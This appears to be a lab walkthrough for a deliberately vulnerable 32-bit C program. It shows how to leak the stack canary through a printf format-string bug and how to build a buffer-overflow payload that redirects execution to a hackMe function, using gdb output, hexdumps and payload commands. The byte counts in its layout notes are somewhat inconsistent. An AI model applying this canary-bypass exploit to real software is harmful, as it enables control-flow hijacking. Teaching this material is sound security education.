# 0. Requirementes
- Ubuntu 16 **32 bits**: https://releases.ubuntu.com/16.04/
- GDB - GNU Debugger
- GCC
- GDB-PEDA: https://github.com/longld/peda
- Python
- Perl
- hexdump

# 1. Compile the `fmt.c` program
```bash
$ gcc fmt.c -o fmt
fmt.c: In function ‘echo’:
fmt.c:35:5: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
     gets(buf);
     ^
fmt.c:36:12: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(buf);
            ^
/tmp/ccxLZfST.o: In function `echo':
fmt.c:(.text+0x11c): warning: the `gets' function is dangerous and should not be used.

```

# 2. Check buffer overflow
```bash
$ python -c "print('A' * 400)" | ./fmt
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

How many bytes should I read from your payload.bin?
File [payload.bin] not found
Segmentation fault (core dumped) # <-- buffer overflow
```

```bash

```

# 3. Check canary
```bash
$ gdb -q fmt
Reading symbols from fmt...(no debugging symbols found)...done.
gdb-peda$ disas echo
Dump of assembler code for function echo:
   0x080486d7 <+0>:	push   ebp
   0x080486d8 <+1>:	mov    ebp,esp
   0x080486da <+3>:	sub    esp,0x38
   0x080486dd <+6>:	mov    eax,gs:0x14
   0x080486e3 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x080486e6 <+15>:	xor    eax,eax
   0x080486e8 <+17>:	mov    DWORD PTR [ebp-0x30],0x0
   0x080486ef <+24>:	sub    esp,0xc
   0x080486f2 <+27>:	push   0x8048873                # each time a function is called
   0x080486f7 <+32>:	call   0x8048440 <printf@plt>   # the parameter is pushed to the stack
   0x080486fc <+37>:	add    esp,0x10
   0x080486ff <+40>:	sub    esp,0xc
   0x08048702 <+43>:	lea    eax,[ebp-0x2c]
   0x08048705 <+46>:	push   eax                      # each time a function is called
   0x08048706 <+47>:	call   0x8048450 <gets@plt>     # the parameter is pushed to the stack
   0x0804870b <+52>:	add    esp,0x10
   0x0804870e <+55>:	sub    esp,0xc
   0x08048711 <+58>:	lea    eax,[ebp-0x2c]
   0x08048714 <+61>:	push   eax                      # each time a function is called
   0x08048715 <+62>:	call   0x8048440 <printf@plt>   # the parameter is pushed to the stack
   0x0804871a <+67>:	add    esp,0x10
   0x0804871d <+70>:	sub    esp,0xc
   0x08048720 <+73>:	push   0x8048884                # each time a function is called
   0x08048725 <+78>:	call   0x8048490 <puts@plt>     # the parameter is pushed to the stack
   0x0804872a <+83>:	add    esp,0x10
   0x0804872d <+86>:	sub    esp,0xc
   0x08048730 <+89>:	lea    eax,[ebp-0x2c]
   0x08048733 <+92>:	push   eax                      # each time a function is called
   0x08048734 <+93>:	call   0x8048624 <readPayload>  # the parameter is pushed to the stack
   0x08048739 <+98>:	add    esp,0x10
   0x0804873c <+101>:	nop
   0x0804873d <+102>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048740 <+105>:	xor    eax,DWORD PTR gs:0x14
   0x08048747 <+112>:	je     0x804874e <echo+119>
   0x08048749 <+114>:	call   0x8048470 <__stack_chk_fail@plt> # <-- Stack canary check
   0x0804874e <+119>:	leave  
   0x0804874f <+120>:	ret    
End of assembler dump.
```

# 4. Browsing the stack
```bash
$ ./fmt
Enter a string: AAAA-%5$x
AAAA-2f

How many bytes should I read from your payload.bin?
0
File [payload.bin] not found

$ ./fmt
Enter a string: AAAA-%7$x
AAAA-41414141               #<-- our input in HEX

How many bytes should I read from your payload.bin?
0
File [payload.bin] not found
```

Now we look for the canary position:
```bash
$ for i in {1..4}; do
> echo "AAAA-%15\$x" | ./fmt
> done
Enter a string: AAAA-25913e00

How many bytes should I read from your payload.bin?
File [payload.bin] not found
Enter a string: AAAA-e0d28f00

How many bytes should I read from your payload.bin?
File [payload.bin] not found
Enter a string: AAAA-54de3700

How many bytes should I read from your payload.bin?
File [payload.bin] not found
Enter a string: AAAA-bf2c7200

How many bytes should I read from your payload.bin?
File [payload.bin] not found
```

Note that we receive the same **two** last values.

# 5. How many bytes?
```bash
   0x080486ff <+40>:	sub    esp,0xc
   0x08048702 <+43>:	lea    eax,[ebp-0x2c]   # 2c (hex) = 44 (dec), address of the buffer
   0x08048705 <+46>:	push   eax
```

We need:
- **44** bytes to hit the EBP register
- ** 4** bytes to fill the EPB register (32 bits system)
- ** 4** bytes to reach the return address
 
So, the payload must have **52** bytes to replace the return address by the address of the hackMe function

32 bytes + 
BUFFER + CANARY + GAP + RETURN ADDRESS|
---|

# 6. Constructing the payload
## 6.1 Current canary value (it changes on every run):
```bash
gdb-peda$ run
Starting program: /home/cgd17/Documents/buffer-overflow/hackMe/fmt 
Enter a string: AAAA-%15$x
AAAA-fa1b2f00

How many bytes should I read from your payload.bin?
0
File [payload.bin] not found
[Inferior 1 (process 3271) exited normally]
Warning: not running
```

## 6.2 'hackMe()' return address
```bash
gdb-peda$ info address hackMe
Symbol "hackMe" is at 0x804860b in a file compiled without debugging.
```
In little-endian: 0x0b860408

## 6.3 Payload
```bash
$ hexdump -C payload.bin
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
00000020  00 72 5d 75 42 42 42 42  42 42 42 42 42 42 42 42  |.r]uBBBBBBBBBBBB|
00000030  0b 86 04 08 0a                                    |.....|
00000035
```

Add these values to the `payload.pl` file in reverse orden (little endian).

# 7. Attack
Run the program:
```bash
$ ./fmt
Enter a string: AAAA-%15$x
AAAA-570d8800

How many bytes should I read from your payload.bin?

```

Generate the payload, remember to update the canary value in `payload.pl`:
```bash
$ perl payload.pl > payload.bin
$ hexdump -C payload.bin
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
00000020  00 72 5d 75 42 42 42 42  42 42 42 42 42 42 42 42  |.r]uBBBBBBBBBBBB| # 20(hex) = 32(dec)
00000030  0b 86 04 08                                       |....|
00000034

```

Continue the program:
```bash
$ ./fmt
Enter a string: AAAA-%15$x
AAAA-570d8800

How many bytes should I read from your payload.bin?
52
That's impossible!!!
Segmentation fault (core dumped)
```

---
More info: https://www.youtube.com/watch?v=0iQhCe-PefE
